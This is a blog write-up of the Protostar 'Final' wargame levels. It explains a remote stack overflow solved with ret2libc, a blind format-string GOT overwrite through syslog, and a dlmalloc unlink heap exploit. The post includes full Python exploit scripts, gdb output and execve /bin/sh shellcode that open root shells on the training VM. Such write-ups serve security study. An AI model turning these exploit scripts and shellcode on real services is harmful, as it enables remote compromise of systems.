---
title: "Protostar - Final"
description: "Writeup for Protostar Final"
pubDate: "March 31 2025"
image: /image/blog-cover/final.gif
categories:
  - tech
tags:
  - Wargame
  - Pwnable
---

Just can't believe I've finished all the Protostar challenges! I know there's still a long way to go, but finishing this one really made my day.

In this blog, I just want to share my solutions and some tips I picked up along the way. Hope you love it! ❄️

## Final 0

Description:

>This level combines a stack overflow and network programming for a remote overflow. <br><br>
>**Hints:** depending on where you are returning to, you may wish to use a toupper() proof shellcode. <br><br>
>Core files will be in /tmp. <br><br>
>This level is at /opt/protostar/bin/final0

Source code:

```c
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```

### Analysis

From <a href="https://dathwang.github.io/blog/protostar-net/" target="_blank">Protostar - Net</a>, we know that `background_process()`, `serve_forever()`, and `set_io()` handle **daemon setup** and **Client-Server communication**. So, let’s focus on `get_username()` instead! 

Right away, you can see a **buffer overflow** in `gets()`, which lets us take control of the program. Since this runs as root and listens for connections, we can turn it into a ***remote root exploit*** and execute our own code!

![toupper problem](public/image/protostar-final/toupper.png)

However, our script won't work because `toupper()` changes lowercase to uppercase. So, how do we work around this?

**Just think backwards.** `strlen()` stops counting at `\0`. If we place `\0` before our exploit, we can bypass `toupper()`.

![strlen-man-page](public/image/protostar-final/strlen.png)

Since `gets()` stops reading at **newline or EOF**, so our exploit payload doesn't break when inserting `\x0`.

![gets-man-page](public/image/protostar-final/gets.png)

Now, let's try a simple payload:

![test-program](public/image/protostar-final/test-program.png)

We successfully overwrote the return address, but **why don't we see any message**?

That's because our program has **no signal handler** for crashes. In `gdb`, we can see it triggers **SIGSEGV (Segmentation Fault)**. Since there's no handler, the kernel **immediately kills the process**, stopping any output before it appears.

Now, let's use the **ret2libc** technique!

First, we need to find the function to execute. In this case, `execve()` will be my choice!

```shell
(gdb) info functions @plt
All functions matching regular expression "@plt":
...
0x08048c0c  execve@plt
...
(gdb) disassemble 0x08048c0c
Dump of assembler code for function execve@plt:
0x08048c0c <execve@plt+0>:      jmp    *0x804ae0c
0x08048c12 <execve@plt+6>:      push   $0x108
0x08048c17 <execve@plt+11>:     jmp    0x80489ec
End of assembler dump.
(gdb) x/wx 0x804ae0c
0x804ae0c <_GLOBAL_OFFSET_TABLE_+144>:  0x08048c12
```

From the `execve()` man page, we see it requires **three parameters**:

![execve-man-page](public/image/protostar-final/execve.png)

So, we'll craft our exploit to overwrite the stack just like this simple C program:

```c
void main() {
    execve("/bin/sh", 0, 0);                                                         
    // int execve(const char *filename, char *const argv[], char *const envp[]);     
    // no arguments and environment variables
}    
```

Here's what the **stack layout** would look like:

![execve-stack](public/image/protostar-final/execve-stack.png)

Now that we understand the stack layout, let's find the address of **"/bin/sh"** in **libc**.

To do this, we need to calculate its address using:
$$
libc base address + offset of /bin/sh
$$

Find the offset of **"bin/sh"**:

```shell
root@protostar:/home/user# ldd /opt/protostar/bin/final0
        linux-gate.so.1 =>  (0xb7fe4000)
        libc.so.6 => /lib/libc.so.6 (0xb7e99000)
        /lib/ld-linux.so.2 (0xb7fe5000)
root@protostar:/home/user# strings -a -t x /lib/libc.so.6 | grep "/bin/sh"
 11f3bf /bin/sh
```

Find the base address of **libc**:

```shell
root@protostar:/home/user# pidof final0
1403
root@protostar:/home/user# cat /proc/1403/maps
08048000-0804a000 r-xp 00000000 00:10 2214       /opt/protostar/bin/final0
0804a000-0804b000 rwxp 00001000 00:10 2214       /opt/protostar/bin/final0
b7e96000-b7e97000 rwxp 00000000 00:00 0
b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so
b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so
b7fd9000-b7fdc000 rwxp 00000000 00:00 0
b7fe0000-b7fe2000 rwxp 00000000 00:00 0
b7fe2000-b7fe3000 r-xp 00000000 00:00 0          [vdso]
b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
bffeb000-c0000000 rwxp 00000000 00:00 0          [stack]
```

Now the address of **"/bin/sh"** will be:

$$
0xb7e97000 + 0x11f3bf = 0xb7fb63bf
$$

### Exploit

```python
import struct, socket, telnetlib

HOST = '127.0.0.1'
PORT = 2995
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

padding = "a" * 511 + "\x00" + "aaaabbbbccccddddeeee"
execve = struct.pack("I", 0x08048c0c)
binsh = struct.pack("I", 0xb7fb63bf)
fake_return_address = "AAAA"

exploit = padding + execve + fake_return_address + binsh + "\x00" * 8

# add new line to handle gets()
s.send(exploit + "\n")

# user telnetlib for Client-Server Communication
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

![final0-successful-exploit](public/image/protostar-final/final0.png)

## Final 1

Description:

>This level is a remote blind format string level. The ‘already written’ bytes can be variable, and is based upon the length of the IP address and port number. <br><br>
>When you are exploiting this and you don't necessarily know your IP address and port number (proxy, NAT / DNAT, etc), you can determine that the string is properly aligned by seeing if it crashes or not when writing to an address you know is good.<br><br>
>Core files will be in /tmp.<br><br>
>This level is at /opt/protostar/bin/final1

Source code:

```c
#include "../common/common.c"

#include <syslog.h>

#define NAME "final1"
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
  char buf[512];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);

  syslog(LOG_USER|LOG_DEBUG, buf);
  // void syslog(int priority, const char *format, ...);
  // buf is the format string! 0v0
}

void trim(char *str)
{
  char *q;

  q = strchr(str, '\r');
  if(q) *q = 0;
  q = strchr(str, '\n');
  if(q) *q = 0;
}

void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, "username ", 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, "login ", 6) == 0) {
          if(username[0] == 0) {
              printf("invalid protocol\n");
          } else {
              logit(line + 6);
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}

void getipport()
{
  int l;
  struct sockaddr_in sin;
//   struct sockaddr_in {
//     sa_family_t    sin_family; /* address family: AF_INET */
//     in_port_t      sin_port;   /* port in network byte order */
//     struct in_addr sin_addr;   /* internet address */
//   };

//   /* Internet address. */
//   struct in_addr {
//     uint32_t       s_addr;     /* address in network byte order */
//   };

  l = sizeof(struct sockaddr_in);
  // int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
  // getpeername()  returns  the address of the peer 
  // connected to the socket sockfd, in the buffer pointed to by addr.
  if(getpeername(0, &sin, &l) == -1) {
      err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 

  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  getipport();
  parser();
}
```

In this level, we will adopt **Remote Format String Exploit** in `syslog()`. 

![syslog-man-page](public/image/protostar-final/syslog-man-page.png)

### Analysis

The program prompts us to enter a **username** using the `username` command and a **password** using the `login` command. These values are then logged into `/var/log/syslog`.

![check-syslog](public/image/protostar-final/check-syslog.png)

Since `syslog()` functions similarly to `printf()`, injecting format specifiers into the **username** or **pw** variables could allow us to manipulate memory.

![format-string-syslog](public/image/protostar-final/format-string-syslog.png)

Let's test it:

![syslog-after-format-string](public/image/protostar-final/syslog-after-format-string.png)

Success! We've dumped memory, confirming the vulnerability.

Now, the goal is to execute `system("/bin/sh")`. There's no direct way in the source code, but we can exploit a trick:

The `strncmp()` function (used for validation) takes `line` as input, just like `system()`. By overwriting **strncmp()'s GOT entry** with `system()`'s address, we can input a command and execute it.

Let's build our exploit and locate `strncmp()` in **GOT**.

```shell
import socket

HOST = '127.0.0.1'
PORT = 2994
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def read_until(check):
        buf = ''
        while check not in buf:
                buf += s.recv(1)
        return buf

username = ''
login = ''

print read_until('[final1] $ ')
s.send('username ' + username + '\n')
raw_input('[Enter] to continue...')
print read_until('[final1] $ ')
s.send('login ' + login + '\n')
print read_until('[final1] $ ')
```

![strncmp-got](public/image/protostar-final/strncmp-got.png)

Now, we just need to overwrite the address of `system()` into **strncmp()'s GOT entry**.

![system-address](public/image/protostar-final/system-address.png)

However, there's a misalignment issue due to **IP and port length**.

![alignment-problem](public/image/protostar-final/alignment-problem.png)

The **A's** aren't aligned, and they might shift depending on the hostname length. To fix this, we adjust the padding so there's no offset.

- Shortest hostname: **9 (x.x.x.x:x)**
- Longest hostname: **21 (xxx.xxx.xxx.xxx:xxxxx)**
- Best padding: **24 (aligned to 32-bit)**

```shell
import socket

HOST = '127.0.0.1'
PORT = 2994
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def read_until(check):
        buf = ''
        while check not in buf:
                buf += s.recv(1)
        return buf

# handle misalignment
host, port = s.getsockname()
hostname = host + ":" + str(port)

pad = 'A' * (24 - len(hostname))
username = pad + 'BBBB' + '%08x ' * 20
login = 'CCCC'

print read_until('[final1] $ ')
s.send('username ' + username + '\n')
raw_input('[Enter] to continue...')
print read_until('[final1] $ ')
s.send('login ' + login + '\n')
print read_until('[final1] $ ')
```

![fix-alignment](public/image/protostar-final/fix-alignment.png)

Great! The alignment issue is fixed. Now, we determine how many characters have been printed so we can precisely overwrite `strncmp()`.

```shell
import socket, struct

HOST = '127.0.0.1'
PORT = 2994
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def read_until(check):
        buf = ''
        while check not in buf:
                buf += s.recv(1)
        return buf

# handle misalignment
host, port = s.getsockname()
hostname = host + ":" + str(port)

pad = 'A' * (24 - len(hostname))
strncmp_got = 0x804a1a8
username = pad + 'BBBB' + struct.pack("I", strncmp_got) + '%18$n'
login = 'CCCC' 

print read_until('[final1] $ ')
s.send('username ' + username + '\n')
print read_until('[final1] $ ')
s.send('login ' + login + '\n')
print read_until('[final1] $ ')
raw_input('waiting... hit [enter]')
```

![characters-overwritten](public/image/protostar-final/characters-overwritten.png)

### Exploit

```shell
import socket, struct, telnetlib

HOST = '127.0.0.1'
PORT = 2994
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def read_until(check):
        buf = ''
        while check not in buf:
                buf += s.recv(1)
        return buf

# handle misalignment
host, port = s.getsockname()
hostname = host + ":" + str(port)

pad = 'A' * (24 - len(hostname))
strncmp_got = 0x804a1a8
username = pad + struct.pack("I", strncmp_got) + struct.pack("I", strncmp_got + 2)
username += '%47036x' + '%18$hn' + '%18372x' + '%17$hn'
login = 'CCCC'

print read_until('[final1] $ ')
s.send('username ' + username + '\n')
print read_until('[final1] $ ')
s.send('login ' + login + '\n')
print read_until('[final1] $ ')

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

![final1-exploit](public/image/protostar-final/final1.png)

## Final 2

Description:

>Remote heap level :) <br><br>
>Core files will be in /tmp.<br><br>
>This level is at /opt/protostar/bin/final2

Source code:

```c
#include "../common/common.c"
#include "../common/malloc.c"

#define NAME "final2"
#define UID 0
#define GID 0
#define PORT 2993

#define REQSZ 128

void check_path(char *buf)
{
  char *start;
  char *p;
  int l;

  /*
  * Work out old software bug
  */

  p = rindex(buf, '/');
  l = strlen(p);
  if(p) {
      start = strstr(buf, "ROOT");
      if(start) {
          while(*start != '/') start--;
          memmove(start, p, l);
          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start < buf ?
          "yes" : "no", start - buf);
      }
  }
}

int get_requests(int fd)
{
  char *buf;
  char *destroylist[256];
  int dll;
  int i;

  dll = 0;
  while(1) {
      if(dll >= 255) break;

      buf = calloc(REQSZ, 1);
      destroylist[dll] = buf; /* Line is missing in original source. gdb disassemble will show it. */
      if(read(fd, buf, REQSZ) != REQSZ) break;

      if(strncmp(buf, "FSRD", 4) != 0) break;

      check_path(buf + 4);

      dll++;
  }

  for(i = 0; i < dll; i++) {
                write(fd, "Process OK\n", strlen("Process OK\n"));
      free(destroylist[i]);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID);

  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  get_requests(fd);
}
```

### Overview

The first line of the description, along with the fact that the code listens on port 2993, suggests that we need to send a TCP packet that takes advantage of a heap-related vulnerability.

`main()` is straightforward. It runs the **final2** binary in the background as **root** and processes requests using `get_requests()`.

- `get_requests()` sets up an array of 256 character pointers and reads input strings into it.
- If any request size isn't **REQSZ** (128 bytes), the function exits the **while(1)** loop.
- If a request payload doesn't start with **FSRD**, the loop also exits.
- Next, `check_path()` is called, and **dll** is incremented.
- A for-loop writes **"Process OK"** to stdout and frees each string buffer, starting from the oldest.

Now, let's break down `check_path()`:

- It finds the right-most **/** in **buf** and stores a pointer to it in **p**.
- **l** is the length of the string starting from **p**.
- If **p** is greater than 0, **start** points to the part of **buf** that contains **"ROOT"**.
- If **"ROOT"** exists in buf, a while loop moves **start** left until it finds a **/**.
- Then, `memmove()` shifts **l** bytes of the string (starting at **p**) to **start**.

A TCP packet containing **FSRD/ROOT/AAAA** will make **p** point to the second **/**, so **p** as a string becomes **/AAAA**.

- **l** is 5.
- **start** initially points to **R** in **ROOT**, but the while loop moves it back to the first **/**.
- `memmove()` then modifies the string to **FSRD/AAAA/AAAA**.

Here's the problem:
- `start--` doesn't check if it's going out of bounds while scanning leftward for a **/**.
- This means `memmove()` can end up writing data outside the intended string buffer, leading to a memory corruption vulnerability.

### Exploit `memmove()`

Let's create a first payload that sets things up so the second payload can overwrite heap memory before the start of the second string.
- First payload: **FSRDAAAA...AAAA/AAAA**.
- Second payload: **FSRDROOTAAA...AAAA/BBBB**.

Here's what happens:
- After the second call to `check_path()`, the heap memory of the first string should now hold **FSRDAAAA...AAAA/BBBB**.

Let's confirm this using a **Python script** and `gdb`:
1. Set a breakpoint right after the call to `check_path()`.
2. Send these two strings and observe the heap memory.

Save the following contents into `final2.py`:

```python
import socket

HOST = '127.0.0.1'
PORT = 2993
REQSZ = 128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

payload1 = "FSRD" + "A" * (REQSZ - 4 - 5) + "/AAAA"

payload2 = "FSRDROOT" + "A" * (REQSZ - 8 - 5) + "/BBBB"

s.send(payload1)
s.send(payload2)
```

The first thing is to set up `gdb`:

![gdb-set-up](public/image/protostar-final/gdb-set-up.png)

Next, disassemble `get_requests()` and set a breakpoint right at where `check_path()` returns.

![get-request-disassemble](public/image/protostar-final/get_requests_disassemble.png)

Let's run our script, and inspect the memory:

![memmove-result](public/image/protostar-final/memmove-result.png)

### Exploit `free()`

With the ability to overwrite bytes after a carefully placed **/** character in a previous heap chunk, we can exploit **a heap overflow** using the `unlink()` technique. The goal is to **redirect execution** by manipulating heap metadata.

We **cannot** overwrite the first chunk's metadata because there's no way to insert a `/` before it. So we **target the second chunk's heap metadata instead**.

When the **first chunk** is freed, `unlink()` executes on the **second chunk**, but only if **dlmalloc** thinks the second chunk has already been freed.

How does **dlmalloc** check this?

- It reads the `PREV_INUSE` bit of the **third chunk** (the lowest bit of the second DWORD of that chunk).

- If the bit is 0, **dlmalloc** assumes the **second chunk is free** and calls `unlink()`.

This means we need to manipulate the **third chunk's PREV_INUSE** bit to fool **dlmalloc**.


To find the **third chunk's starting address**, `dlmalloc` adds $(chunk start address) + (chunk size & ~0x1)$

![heap-dump](public/image/protostar-final/heap-dump.png)

For our **second chunk**:

- It starts at `0x804e088`.

- `dlmalloc` calculates the **third chunk's start** as $0x804e088 + (0x00000089 & ~0x1) = 0x804e110$.

- We need to **overwrite arbitrary bytes** inside this **third chunk**.

Since we **already control the second chunk's metadata**, can we **make dlmalloc** think the third chunk is **somewhere inside the second chunk**?

Yes, because **dlmalloc does not validate that the third chunk is actually placed right after the second**. It blindly adds the **size field** to the chunk's start address.

We **set the second chunk’s size** to `0xfffffffc` (**-4** in signed integer form).
This tricks `dlmalloc` into calculating:

$$
0x804e088 + 0xfffffffc = 0x804e084
$$

So, dlmalloc **believes the third chunk starts inside the second chunk**, with the size field of `0xfffffffc`.

Since dlmalloc thinks the second chunk is already free, it calls `unlink()`.

Now, we **craft the forward and backward pointers** in the second chunk to **redirect execution**.

Just like in <a href="https://dathwang.github.io/blog/protostar-heap/#heading-11" target="_blank">Heap 3</a>, we will overwrite a function pointer in the GOT entry to point to our shellcode. Since we send two packets, **dll** will be 2. The for-loop will call `write()` twice. The first `free()` will overwrite `write()`'s address in the GOT entry. Let's find the GOT address containing the address of `write()`.

```shell
(gdb) info functions write
...
0x08048dfc  write@plt
0x08048f2c  fwrite
0x08048f2c  fwrite@plt
(gdb) disassemble 0x08048dfc
Dump of assembler code for function write@plt:
0x08048dfc <write@plt+0>:       jmp    DWORD PTR ds:0x804d41c
0x08048e02 <write@plt+6>:       push   0x68
0x08048e07 <write@plt+11>:      jmp    0x8048d1c
End of assembler dump.
(gdb) x/wx 0x804d41c
0x804d41c <_GLOBAL_OFFSET_TABLE_+64>:   0xb7f53c70
```

We want to overwrite the contents of `0x804d41c` with **the address of our shellcode**.

Since `unlink()` adds **12** to the forward pointer, we set:

$$
forward pointer = 0x804d41c - 12 = 0x804d410
$$

And the backward pointer will **point to a place on the heap**.

### Crafting Exploit

We will place our shellcode in the first chunk, starting at `0x804e010`, since the first two DWORDs will be the forward and backward pointers during the first `free()`. And this address will also be our **backward pointer**.

Here is the general format of the two payloads:

```shell
payload1 = FSRD AAAA <payload> AAAA...AAA/
payload2 = FSRD ROOT/ 0xfffffffc 0xfffffffc 0x804d410 0x804e010 AAAA...AAAA
```

The spacing in the payloads is for clarity; it will be removed in the actual exploit.

To check if our exploit executes correctly, we'll use an `INT3` **(0xCC)** instruction. If we hit a `SIGTRAP` signal, it means execution successfully redirects to our shellcode.

```python
import socket

HOST = '127.0.0.1'
PORT = 2993
REQSZ = 128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

shellcode = "\xcc\xcc\xcc\xcc"

payload1 = "FSRD" + "AAAA" + shellcode
payload1 += "A" * (REQSZ - len(payload1) - 1 ) + "/"

write_got = struct.pack("I", 0x804d410)
heap_return = struct.pack("I", 0x804e010)

payload2 = "FSRDROOT/" + struct.pack("I", 0xfffffffc) + struct.pack("I", 0xfffffffc) + write_got + heap_return
payload2 += "A" * (REQSZ - len(payload2))

s.send(payload1)
s.send(payload2)
```

![sigtrap](public/image/protostar-final/sigtrap.png)

Success! Now, let's refine our **actual exploit**.

### Solution

This is the <a href="https://shell-storm.org/shellcode/files/shellcode-575.html" target="_blank">shellcode</a> that I use. 

However, there's a problem, where `unlink()` always overwrites memory at `0x804e018`. This means **we lose four bytes** of our shellcode. 

What we need to overcome this is to make our shellcode **skip past** `0x804e018` and continue execution at `0x804e01C`. Luckily the `jmp` instruction (`\xeb`) does exactly this. Its argument is how many bytes to jump over. So our shellcode can start with `0xeb 0x0a` which moves the instruction pointer 10 bytes forward. We fill in the middle 10 bytes with `NOPs` (`0x90`). 

Our final script will be this.

```python
import socket, struct, telnetlib

HOST = '127.0.0.1'
PORT = 2993
REQSZ = 128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

shellcode = "\xeb\x0a" + "\x90" * 10 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

payload1 = "FSRD" + "AAAA" + shellcode
payload1 += "A" * (REQSZ - len(payload1) - 1 ) + "/"

write_got = struct.pack("I", 0x804d410)
heap_return = struct.pack("I", 0x804e010)

payload2 = "FSRDROOT/" + struct.pack("I", 0xfffffffc) + struct.pack("I", 0xfffffffc) + write_got + heap_return
payload2 += "A" * (REQSZ - len(payload2))

s.send(payload1)
s.send(payload2)

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

![final2-win](public/image/protostar-final/final2.png)

### Refereces

- <a href="https://dathwang.github.io/blog/protostar-heap/#heading-11" target="_blank">Protostar Heap 3</a>
- <a href="https://gist.github.com/dathwang/89a6b012828ed26f6cb2a7961908d333" target="_blank">Old school dlmalloc</a>
- <a href="https://shell-storm.org/shellcode/files/shellcode-575.html" target="_blank">Linux/x86 - execve /bin/sh - 21 bytes</a>